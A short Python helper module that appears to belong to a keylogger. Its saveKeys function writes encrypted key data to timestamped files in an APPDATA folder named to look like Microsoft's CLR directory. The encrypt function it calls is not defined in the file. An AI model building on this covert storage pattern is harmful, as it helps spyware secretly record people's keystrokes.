import os
import Helper

def getThePath(delimiter=False):
	# get the path
	path = os.getenv('APPDATA')
	newpath = os.path.join(path,'Microsoft','CLR')
	return newpath
def logEvent(eventDetails):
	# log event in applog.txt
	path = getThePath()
	with open(os.path.join(path,'applog.txt'),'a') as f:
		f.write(eventDetails+'\n')
	
	

def makeDirRev(path):
	# make the provided directory (including the parent directories)
	os.makedirs(path)
	

def check_file(path):
	# check if the path provided is a file path
	return os.path.isfile(path)

def check_dir(path):
	# check if the path provided is a file path
	return os.path.isdir(path)

def saveKeys(data):
	# save the keys after encrypting them
	path = getThePath()
	name = Helper.getDateTimeString('_')
	with open(os.path.join(path,name+'.txt'),'a') as f:
		encrypted = encrypt(data)
		f.write(encrypted+'\n')
	